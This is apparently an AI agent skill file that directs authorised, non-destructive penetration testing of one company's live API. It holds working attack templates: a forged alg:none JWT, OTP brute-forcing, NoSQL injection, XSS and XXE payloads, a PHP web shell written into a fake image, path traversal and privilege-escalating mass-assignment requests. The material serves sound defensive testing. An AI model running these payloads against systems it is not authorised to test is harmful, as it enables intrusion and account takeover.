---
name: brikops-pen-tester
description: |
  Active penetration tester for BrikOps. Sends real HTTP requests to api.brikops.com and app.brikops.com to find vulnerabilities — auth bypass, IDOR, injection, rate limiting, header misconfig, info disclosure, mass assignment, file upload abuse, race conditions, OpenAPI surface analysis. Non-destructive: only GET requests and safe POST probes (invalid data, wrong tokens). Use this skill whenever Zahi asks to attack, pentest, hack, probe, or stress-test BrikOps, or when he says "תתקוף", "בדיקת חדירה", "pentest", "האם אנחנו מוגנים", "תנסה לפרוץ", "בדיקת אבטחה אקטיבית", "תתקוף את ה-API", "red team", "simulate attack". This is DIFFERENT from brikops-security-auditor which does static code analysis — this skill actively probes the live system.
---

# BrikOps Pen Tester (v2)

You are simulating a real attacker probing BrikOps from the outside. Your job is to find vulnerabilities by sending actual HTTP requests to the production API, analyzing responses, and reporting what you find — without breaking anything.

**Changelog v2 (2026-04-22):**
- Added Module 9: Mass Assignment / Field Whitelist Bypass
- Added Module 10: File Upload Security
- Added Module 11: Race Conditions / TOCTOU
- Added Module 12: OpenAPI / API Surface Disclosure
- Enhanced Module 1 with subdomain enumeration + extended sensitive paths
- Enhanced Module 2 with timing-attack user enumeration
- Enhanced Module 7 with CORS+credentials and Host header injection

## Safety Rules (non-negotiable)

The whole point of this skill is to find problems WITHOUT causing them. Every attack must be reversible or read-only.

**ALLOWED:**
- GET requests to any endpoint (read-only)
- POST/PUT/PATCH with deliberately invalid data (wrong types, missing fields, SQL/NoSQL injection strings) — these should be rejected by the server
- POST with expired/invalid/malformed JWT tokens — tests auth validation
- Sending crafted headers (XSS payloads in User-Agent, oversized headers, etc.)
- Rapid sequential requests to test rate limiting (but stop after limit is hit, don't DoS)
- Checking response headers, error messages, and status codes for information disclosure
- Mass-assignment probes: PATCH with extra read-only fields and verify they're ignored
- File upload probes with TINY safe payloads (e.g., 1KB SVG with `<script>` to test stripping) — uploads to fake/placeholder resource IDs that 404, NOT real ones

**FORBIDDEN:**
- Creating real users, organizations, projects, tasks, or any persistent data
- Modifying or deleting any existing data
- Sending valid destructive requests (DELETE, account deletion, billing changes)
- Sustained high-volume traffic (more than 50 requests per test module)
- Accessing other users' actual data — only test whether the *attempt* is blocked
- Exfiltrating real PII — if you find exposed PII, note it in the report but don't store or display the actual values
- Uploading files larger than 10KB (just enough to test validation)
- Race condition tests that could create real duplicate records — only race against fake/non-existent IDs

## Target Environment

- **API**: `https://api.brikops.com/api/`
- **Frontend**: `https://app.brikops.com`
- **Auth**: JWT Bearer tokens in Authorization header
- **Database**: MongoDB Atlas (test for NoSQL injection patterns)
- **Stack**: FastAPI (Python) + React 19 + Capacitor 7 mobile

## Before You Start

Ask Zahi for ONE of these (needed for authenticated endpoint testing):
1. A valid JWT token from a test account (preferred — paste from browser DevTools)
2. OR a test phone number to get a fresh OTP and generate a token via `/api/auth/request-otp` + `/api/auth/verify-otp`

**For maximum-quality testing, ask for TWO tokens from different tenants** — this enables real cross-tenant IDOR validation.

If neither is available, run only the unauthenticated modules (1, 2, 3, 7, 12). That's still valuable.

---

## Module 1: Reconnaissance (unauthenticated) — ENHANCED

Goal: discover what the server reveals to an anonymous attacker.

```bash
BASE="https://api.brikops.com"

# 1.1 — Server fingerprinting
curl -sI "$BASE/api/health" | head -30

# 1.2 — Error page fingerprinting
curl -s "$BASE/nonexistent-path-12345" | head -50
curl -s "$BASE/api/" | head -50

# 1.3 — Common sensitive paths (extended)
for path in ".env" ".git/config" "debug" "docs" "openapi.json" "redoc" "admin" "graphql" \
            "api/debug" "api/config" "api/health" "api/ready" ".well-known/security.txt" \
            "api/docs" "api/redoc" "api/openapi.json" "swagger" "swagger-ui" "api-docs" \
            "actuator" "metrics" "phpinfo.php" "wp-admin" "config.json" "package.json" \
            "robots.txt" "sitemap.xml" "backup.sql" "backup.zip" "dump.sql"; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "$BASE/$path")
  echo "$path → $status"
done

# 1.3b — Subdomain enumeration
for sub in "staging" "stage" "dev" "test" "admin" "api-staging" "api-dev" \
           "internal" "beta" "demo" "preview" "qa" "old" "legacy" "backup" \
           "monitoring" "grafana" "kibana" "jenkins" "git" "files" "cdn"; do
  status=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "https://${sub}.brikops.com" 2>/dev/null || echo "TIMEOUT")
  echo "${sub}.brikops.com → $status"
done

# 1.4 — CORS probe (multiple origins)
for origin in "https://evil-attacker.com" "null" "https://app.brikops.com.evil.com" \
              "http://localhost:3000" "https://app.brikops.com"; do
  result=$(curl -sI -H "Origin: $origin" "$BASE/api/health" | grep -i "access-control")
  echo "Origin=$origin → $result"
done

# 1.5 — HTTP methods probe
for method in GET POST PUT DELETE PATCH OPTIONS TRACE CONNECT HEAD; do
  status=$(curl -s -o /dev/null -w "%{http_code}" -X "$method" "$BASE/api/health")
  echo "$method /api/health → $status"
done
```

**What to report:**
- Sensitive info in headers (server version, framework)
- Debug/admin endpoints responding 200
- Any subdomain that responds (especially staging without auth)
- CORS misconfiguration
- Stack traces in error responses
- TRACE/CONNECT enabled

---

## Module 2: Authentication Attacks — ENHANCED

```bash
BASE="https://api.brikops.com/api"

# 2.1 — Missing auth
for endpoint in "projects" "users/me" "organizations" "tasks" "billing" "invites" \
                "tenants" "memberships" "qc" "handover" "data-export"; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "$BASE/$endpoint")
  echo "No auth: $endpoint → $status"
done

# 2.2 — Malformed JWT
curl -s -H "Authorization: Bearer not-a-real-token" "$BASE/users/me"
curl -s -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiZmFrZSJ9.invalid" "$BASE/users/me"
# Try common bypass headers
curl -s -H "X-Forwarded-For: 127.0.0.1" -H "X-Real-IP: 127.0.0.1" "$BASE/admin/users"
curl -s -H "X-User-Id: 00000000-0000-0000-0000-000000000001" "$BASE/users/me"
curl -s -H "X-Tenant-Id: anything" "$BASE/projects"

# 2.3 — Algorithm confusion: alg:none
ALG_NONE=$(python3 -c "
import base64, json
header = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=').decode()
payload = base64.urlsafe_b64encode(json.dumps({'user_id':'admin','platform_role':'super_admin'}).encode()).rstrip(b'=').decode()
print(f'{header}.{payload}.')
")
curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $ALG_NONE" "$BASE/users/me"

# 2.4 — OTP brute force resistance
for i in $(seq 1 6); do
  curl -s -X POST "$BASE/auth/verify-otp" \
    -H "Content-Type: application/json" \
    -d '{"phone_e164":"+972501111111","code":"'$i$i$i$i$i$i'"}'
  echo ""
done

# 2.5 — OTP request flooding
for i in $(seq 1 5); do
  status=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$BASE/auth/request-otp" \
    -H "Content-Type: application/json" \
    -d '{"phone_e164":"+972501111111"}')
  echo "OTP req $i → $status"
done

# 2.6 — User enumeration via timing (NEW)
# Time difference between "phone exists" vs "phone doesn't exist" reveals registered users
echo "=== Timing test: existing phone (use a known test account) ==="
for i in 1 2 3; do
  time curl -s -o /dev/null -X POST "$BASE/auth/request-otp" \
    -H "Content-Type: application/json" \
    -d '{"phone_e164":"+972501234567"}'  # replace with real test phone if known
done

echo "=== Timing test: random non-existent phone ==="
for i in 1 2 3; do
  time curl -s -o /dev/null -X POST "$BASE/auth/request-otp" \
    -H "Content-Type: application/json" \
    -d '{"phone_e164":"+972500000'$RANDOM'"}'
done
# If existing-phone is consistently slower (e.g., DB lookup + SMS send) vs not-exists
# (immediate reject), that's user enumeration.

# 2.7 — Response-body enumeration
# Check whether response differs for known vs unknown phone
curl -sv -X POST "$BASE/auth/request-otp" \
  -H "Content-Type: application/json" \
  -d '{"phone_e164":"+972500000000"}' 2>&1 | tail -30

# 2.8 — JWT weak secret (HS256) — try common weak secrets
# Only attempt if Module 12 reveals JWT structure
WEAK_SECRETS=("secret" "password" "brikops" "changeme" "123456" "jwt_secret" "your-secret-key")
for secret in "${WEAK_SECRETS[@]}"; do
  python3 -c "
import jwt, sys
try:
    decoded = jwt.decode('$TOKEN', '$secret', algorithms=['HS256'])
    print(f'WEAK SECRET FOUND: $secret → {decoded}')
    sys.exit(0)
except Exception as e:
    pass
" 2>/dev/null
done
```

**What to report:**
- Endpoints accessible without auth
- JWT validation bypass (alg:none, malformed accepted, weak secret)
- Trusted spoofable headers (X-User-Id, X-Forwarded-For granting auth)
- Missing rate limiting on auth endpoints
- Timing-based user enumeration
- Verbose error messages

---

## Module 3: Input Injection (unauthenticated) — kept as-is

```bash
BASE="https://api.brikops.com/api"

# 3.1 — NoSQL injection
curl -s -X POST "$BASE/auth/verify-otp" -H "Content-Type: application/json" \
  -d '{"phone_e164":{"$gt":""},"code":"123456"}'
curl -s -X POST "$BASE/auth/verify-otp" -H "Content-Type: application/json" \
  -d '{"phone_e164":"+972501234567","code":{"$gt":""}}'
curl -s -X POST "$BASE/auth/verify-otp" -H "Content-Type: application/json" \
  -d '{"phone_e164":"+972501234567","code":{"$ne":null}}'
curl -s -X POST "$BASE/auth/verify-otp" -H "Content-Type: application/json" \
  -d '{"phone_e164":"+972501234567","code":{"$regex":".*"}}'

# 3.2 — XSS in registration
curl -s -X POST "$BASE/auth/register-with-phone" -H "Content-Type: application/json" \
  -d '{"phone_e164":"+972509999999","full_name":"<script>alert(1)</script>","track":"subcontractor"}'
curl -s -X POST "$BASE/auth/register-with-phone" -H "Content-Type: application/json" \
  -d '{"phone_e164":"+972509999998","full_name":"\"><img src=x onerror=alert(1)>","track":"subcontractor"}'

# 3.3 — Path traversal
curl -s "$BASE/projects/../../../../etc/passwd"
curl -s "$BASE/projects/%2e%2e%2f%2e%2e%2fetc%2fpasswd"

# 3.4 — Oversized payload
python3 -c "print('{\"phone_e164\":\"+972501234567\",\"code\":\"' + 'A'*1000000 + '\"}')" | \
  curl -s -X POST "$BASE/auth/verify-otp" -H "Content-Type: application/json" -d @-

# 3.5 — Null byte injection
curl -s -X POST "$BASE/auth/verify-otp" -H "Content-Type: application/json" \
  -d '{"phone_e164":"+972501234567\u0000","code":"123456"}'

# 3.6 — Unicode normalization
curl -s -X POST "$BASE/auth/register-with-phone" -H "Content-Type: application/json" \
  -d '{"phone_e164":"+972509999997","full_name":"admin\u202E","track":"subcontractor"}'
```

---

## Module 4: IDOR (requires auth token) — kept as-is

(see original — Module 4 unchanged)

---

## Module 5: Privilege Escalation — kept as-is

(see original — Module 5 unchanged)

---

## Module 6: Rate Limiting — kept as-is

(see original — Module 6 unchanged)

---

## Module 7: Security Headers & TLS — ENHANCED

```bash
BASE="https://api.brikops.com"
FRONTEND="https://app.brikops.com"

# 7.1 — Security headers on API
echo "=== API Headers ==="
curl -sI "$BASE/api/health"

# 7.2 — Security headers on frontend
echo "=== Frontend Headers ==="
curl -sI "$FRONTEND"

# 7.3 — TLS configuration
python3 -c "
import ssl, socket
for host in ['api.brikops.com', 'app.brikops.com']:
    ctx = ssl.create_default_context()
    with ctx.wrap_socket(socket.socket(), server_hostname=host) as s:
        s.connect((host, 443))
        print(f'{host}: {s.version()} cipher={s.cipher()[0]}')
"

# 7.4 — Cookie security
curl -sI -c - "$BASE/api/health"

# 7.5 — HTTPS enforcement
curl -sI -o /dev/null -w "%{http_code} %{redirect_url}\n" "http://api.brikops.com/api/health"
curl -sI -o /dev/null -w "%{http_code} %{redirect_url}\n" "http://app.brikops.com"

# 7.6 — CORS preflight + credentials (NEW — CRITICAL)
echo "=== CORS preflight with credentials ==="
curl -sI -X OPTIONS \
  -H "Origin: https://evil-attacker.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: authorization" \
  "$BASE/api/users/me"
# CRITICAL FAIL: Access-Control-Allow-Credentials: true + ACAO not strictly app.brikops.com
# = full session theft possible

# Also test origin reflection
curl -sI -X OPTIONS \
  -H "Origin: https://app.brikops.com.attacker.com" \
  -H "Access-Control-Request-Method: POST" \
  "$BASE/api/users/me"

# Test null origin (some apps wrongly trust this)
curl -sI -X OPTIONS \
  -H "Origin: null" \
  -H "Access-Control-Request-Method: POST" \
  "$BASE/api/users/me"

# 7.7 — Host header injection (NEW)
curl -sI -H "Host: attacker.com" "https://api.brikops.com/api/health"
curl -sI -H "X-Forwarded-Host: attacker.com" "https://api.brikops.com/api/health"
curl -sI -H "X-Host: attacker.com" "https://api.brikops.com/api/health"
# If 200 with attacker.com reflected anywhere (Location header for redirects, body),
# password-reset emails could be poisoned to point to attacker domain.

# 7.8 — HTTP/2 + HTTP/3 support
curl -sI --http2 "$BASE/api/health" 2>&1 | grep -i "HTTP/"
curl -sI --http3 "$BASE/api/health" 2>&1 | grep -i "HTTP/" || echo "no h3"
```

**What to report:**
- Missing HSTS, CSP, X-Content-Type-Options, X-Frame-Options
- Server/framework version disclosure
- Weak TLS or old protocol versions
- Missing HTTPS redirect
- **CRITICAL: ACAC=true + reflected/wildcard origin**
- Host header reflected without validation

---

## Module 8: Business Logic — kept as-is

(see original — Module 8 unchanged)

---

## Module 9: Mass Assignment / Field Whitelist Bypass (NEW)

Goal: test whether `PATCH /users/me` and similar self-update endpoints accept fields they shouldn't.

```bash
TOKEN="<valid-jwt>"
BASE="https://api.brikops.com/api"

# 9.1 — Self-update with privilege escalation fields
PRIVILEGED_FIELDS=(
  '{"platform_role":"super_admin"}'
  '{"role":"super_admin"}'
  '{"is_super_admin":true}'
  '{"is_admin":true}'
  '{"is_staff":true}'
  '{"verified":true}'
  '{"phone_verified":true}'
  '{"email_verified":true}'
  '{"tenant_id":"00000000-0000-0000-0000-000000000099"}'
  '{"organization_id":"00000000-0000-0000-0000-000000000099"}'
  '{"id":"00000000-0000-0000-0000-000000000001"}'
  '{"_id":"00000000-0000-0000-0000-000000000001"}'
  '{"created_at":"1970-01-01T00:00:00Z"}'
  '{"deleted_at":null}'
  '{"password_hash":"x"}'
  '{"otp_required":false}'
  '{"sub_role":"safety_officer","platform_role":"super_admin"}'
)

for payload in "${PRIVILEGED_FIELDS[@]}"; do
  status=$(curl -s -o /dev/null -w "%{http_code}" -X PATCH \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "$payload" \
    "$BASE/users/me")
  echo "PATCH /users/me $payload → $status"
done

# Then verify by re-fetching profile — has any field changed?
curl -s -H "Authorization: Bearer $TOKEN" "$BASE/users/me" | python3 -m json.tool

# 9.2 — Project membership privilege escalation
# Try to upgrade your role within a project you belong to
MY_PROJECT="<from /users/me response>"
curl -s -o /dev/null -w "%{http_code}" -X PATCH \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role":"project_manager","sub_role":"safety_officer"}' \
  "$BASE/projects/$MY_PROJECT/memberships/me"

# 9.3 — Membership reassignment to other tenant
curl -s -o /dev/null -w "%{http_code}" -X PATCH \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"tenant_id":"different-tenant-id"}' \
  "$BASE/users/me"

# 9.4 — Try field aliases (some frameworks accept snake_case AND camelCase)
for field in "platformRole" "platform-role" "PlatformRole" "PLATFORM_ROLE"; do
  payload='{"'$field'":"super_admin"}'
  status=$(curl -s -o /dev/null -w "%{http_code}" -X PATCH \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "$payload" "$BASE/users/me")
  echo "Alias $field → $status"
done

# 9.5 — Verify fields were not silently accepted
echo "=== Final profile state ==="
curl -s -H "Authorization: Bearer $TOKEN" "$BASE/users/me"
```

**What to report:**
- ANY response 200 to a payload that should be rejected
- Any field that ACTUALLY changed in the profile after these requests
- Field aliases that bypass validation (camelCase vs snake_case)

---

## Module 10: File Upload Security (NEW)

Goal: test whether file uploads validate type, size, content, and filename.

BrikOps stores photos for defects, QC, handover, signatures — file upload is a hot attack surface.

```bash
TOKEN="<valid-jwt>"
BASE="https://api.brikops.com/api"
TMPDIR=$(mktemp -d)

# Find a real upload endpoint first (try common patterns)
# Likely candidates: /tasks/{id}/attachments, /defects/{id}/photos, /qc/photos, /signatures

# 10.1 — Wrong content-type / extension mismatch
echo "<?php echo system(\$_GET['cmd']); ?>" > $TMPDIR/shell.jpg
curl -s -o /dev/null -w "%{http_code}" -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@$TMPDIR/shell.jpg;type=image/jpeg" \
  "$BASE/tasks/fake-id/attachments"
# Server should: reject (no real magic bytes) OR strip OR sandbox

# 10.2 — Polyglot: valid PNG header + PHP/HTML payload
python3 -c "
import struct
# Minimal PNG header + IHDR
png = b'\x89PNG\r\n\x1a\n' + b'\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89'
# Append HTML/JS as a comment chunk
malicious = b'<script>alert(\"xss\")</script>'
with open('$TMPDIR/polyglot.png', 'wb') as f:
    f.write(png + malicious)
"
curl -s -o /dev/null -w "%{http_code}" -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@$TMPDIR/polyglot.png;type=image/png" \
  "$BASE/tasks/fake-id/attachments"

# 10.3 — SVG with embedded JavaScript (CRITICAL — common XSS vector)
cat > $TMPDIR/xss.svg <<'EOF'
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1">
  <script type="text/javascript">alert("xss-via-svg")</script>
</svg>
EOF
curl -s -o /dev/null -w "%{http_code}" -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@$TMPDIR/xss.svg;type=image/svg+xml" \
  "$BASE/tasks/fake-id/attachments"
# Should be rejected. If accepted, served with image/svg+xml = stored XSS.

# 10.4 — Path traversal in filename
echo "test" > "$TMPDIR/test.jpg"
curl -s -o /dev/null -w "%{http_code}" -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@$TMPDIR/test.jpg;filename=../../../../etc/passwd" \
  "$BASE/tasks/fake-id/attachments"
curl -s -o /dev/null -w "%{http_code}" -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@$TMPDIR/test.jpg;filename=..%2F..%2F..%2Fetc%2Fpasswd" \
  "$BASE/tasks/fake-id/attachments"

# 10.5 — Null byte in filename
curl -s -o /dev/null -w "%{http_code}" -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@$TMPDIR/test.jpg;filename=evil.php%00.jpg" \
  "$BASE/tasks/fake-id/attachments"

# 10.6 — Oversized file (test size limit) — capped at 10KB to be safe
dd if=/dev/zero of=$TMPDIR/big.jpg bs=1024 count=10 2>/dev/null
curl -s -o /dev/null -w "%{http_code}" -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@$TMPDIR/big.jpg;type=image/jpeg" \
  "$BASE/tasks/fake-id/attachments"

# 10.7 — Wrong MIME type with executable extension
curl -s -o /dev/null -w "%{http_code}" -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@$TMPDIR/shell.jpg;filename=shell.php;type=image/jpeg" \
  "$BASE/tasks/fake-id/attachments"

# 10.8 — XXE in PDF/SVG
cat > $TMPDIR/xxe.svg <<'EOF'
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">&xxe;</svg>
EOF
curl -s -o /dev/null -w "%{http_code}" -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@$TMPDIR/xxe.svg;type=image/svg+xml" \
  "$BASE/tasks/fake-id/attachments"

# 10.9 — Test S3 / object storage direct URL pattern
# If an upload returns a URL, check whether direct access bypasses auth
# (Don't actually download — just check the URL pattern in response)

rm -rf $TMPDIR
```

**What to report:**
- Files accepted with mismatched extension/content-type
- SVG with `<script>` not sanitized
- Path traversal in filename creating files outside upload dir
- No size limit (or limit too high — > 50MB)
- Files served with executable MIME types
- Direct S3/storage URLs accessible without auth

---

## Module 11: Race Conditions / TOCTOU (NEW)

Goal: detect time-of-check-vs-time-of-use bugs by sending concurrent requests.

These are the bugs where an action that should happen ONCE happens MULTIPLE times due to no transaction.

```bash
TOKEN="<valid-jwt>"
BASE="https://api.brikops.com/api"

# 11.1 — Concurrent OTP verify (test if 6 valid attempts run in parallel = 6 sessions)
# Use a deliberately wrong code so we don't actually authenticate, but fire concurrently
echo "=== Concurrent OTP verify ==="
for i in $(seq 1 10); do
  curl -s -o /dev/null -w "%{http_code} " -X POST "$BASE/auth/verify-otp" \
    -H "Content-Type: application/json" \
    -d '{"phone_e164":"+972501111111","code":"999999"}' &
done
wait
echo ""

# 11.2 — Concurrent invite creation (test for duplicate invite race)
# Use fake project_id so invites won't actually create
echo "=== Concurrent invite creation ==="
for i in $(seq 1 5); do
  curl -s -o /dev/null -w "%{http_code} " -X POST "$BASE/invites" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"phone_e164":"+972500000000","role":"contractor","project_id":"fake-project-id"}' &
done
wait
echo ""

# 11.3 — Concurrent profile update (test if last-write-wins or if all are processed)
echo "=== Concurrent profile update ==="
for i in $(seq 1 5); do
  curl -s -o /dev/null -w "%{http_code} " -X PATCH "$BASE/users/me" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"full_name":"race-'$i'"}' &
done
wait
echo ""

# 11.4 — Concurrent billing checkout (CRITICAL if real)
# DO NOT actually create real checkouts — only target nonsense org IDs that should 403
echo "=== Concurrent billing checkout (against fake org) ==="
for i in $(seq 1 5); do
  curl -s -o /dev/null -w "%{http_code} " -X POST "$BASE/billing/checkout" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"org_id":"00000000-0000-0000-0000-000000000099","plan":"pro"}' &
done
wait
echo ""

# 11.5 — Concurrent file upload to same resource ID (race in storage layer)
# (skip this if Module 10 already exhausted — same payload pattern)
```

**What to report:**
- Multiple concurrent requests to OTP verify all returning 200 (= multiple sessions for one OTP)
- Multiple concurrent invites all succeeding for the same phone+project
- Profile updates losing data (race write)
- Billing endpoints not idempotent

---

## Module 12: OpenAPI / API Surface Disclosure (NEW)

Goal: if FastAPI's auto-docs are exposed, the entire attack surface is handed to you.

```bash
BASE="https://api.brikops.com"

# 12.1 — Try every common docs path
for path in "/docs" "/redoc" "/openapi.json" \
            "/api/docs" "/api/redoc" "/api/openapi.json" \
            "/api/v1/docs" "/api/v1/openapi.json" \
            "/swagger" "/swagger-ui" "/swagger-ui.html" \
            "/api-docs" "/api-spec"; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "$BASE$path")
  echo "$BASE$path → $status"
done

# 12.2 — If openapi.json found, save and analyze
OPENAPI_PATH="/api/openapi.json"  # adjust based on what 12.1 found
curl -s "$BASE$OPENAPI_PATH" -o /tmp/openapi.json
if [ -s /tmp/openapi.json ]; then
  echo "=== OpenAPI exposed! Analyzing... ==="
  python3 -c "
import json
spec = json.load(open('/tmp/openapi.json'))
paths = spec.get('paths', {})
print(f'Total endpoints: {len(paths)}')
print(f'Total operations: {sum(len(v) for v in paths.values())}')
print()
print('=== Endpoints WITHOUT auth (security: empty) ===')
for path, methods in paths.items():
    for method, op in methods.items():
        if not op.get('security') and not op.get('parameters', []):
            pass  # too noisy, skip
print()
print('=== Admin / debug / internal endpoints ===')
for path in paths:
    if any(k in path.lower() for k in ['admin', 'debug', 'internal', 'super', 'platform']):
        print(f'  {list(paths[path].keys())} {path}')
print()
print('=== All endpoints (first 30) ===')
for i, path in enumerate(sorted(paths.keys())[:30]):
    methods = ','.join(paths[path].keys()).upper()
    print(f'  {methods:25} {path}')
"
fi

# 12.3 — JSON Schema component disclosure
# Components reveal field names, types, validators — useful for crafting precise attacks
if [ -s /tmp/openapi.json ]; then
  python3 -c "
import json
spec = json.load(open('/tmp/openapi.json'))
schemas = spec.get('components', {}).get('schemas', {})
print(f'=== {len(schemas)} schemas exposed ===')
for name in sorted(schemas.keys())[:20]:
    fields = list(schemas[name].get('properties', {}).keys())
    print(f'  {name}: {fields[:8]}{\"...\" if len(fields)>8 else \"\"}')
"
fi

# 12.4 — GraphQL introspection (if /graphql exists)
curl -s -X POST "$BASE/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name}}}"}'
```

**What to report:**
- ANY of the docs paths returning 200 in production (should be disabled)
- Full count of endpoints exposed, with admin/internal ones flagged
- Schema components revealing internal field names that aren't supposed to be in API
- GraphQL introspection enabled

---

## Running the Pen Test

### Execution flow:
1. Ask Zahi for JWT token(s) — ideally 2 from different tenants
2. Run unauthenticated modules first: 1, 2, 3, 7, 12
3. Run authenticated modules: 4, 5, 6, 8, 9, 10, 11
4. Compile report

### For each test:
1. Run the command
2. Record: endpoint, method, payload (summary), response status, response body (first 200 chars)
3. Classify: PASS / FINDING
4. For findings: assess severity (CRIT / HIGH / MED / LOW)

### Adapting tests:
The commands above are templates. Adapt them based on what you discover. If Module 12 reveals 200+ endpoints, prioritize the ones that look most sensitive.

---

## Report Format

```markdown
# BrikOps Penetration Test Report — [Date]

## Summary
- Target, modules run, auth level, totals, duration

## Critical / High / Medium / Low Findings
For each: Module, Endpoint, Payload, Response, Impact, Fix, Reproduction command

## Passed Tests
What was tested and found secure.

## Recommendations (priority order)
```

Save report to `/Users/zhysmy/brikops-new/security/pentest-report-YYYY-MM-DD.md`.

## When to Rerun

- After every major feature deployment
- After security-related code changes
- At least monthly
- Before app store submissions
- After every Replit deploy that touches auth/billing/uploads/admin
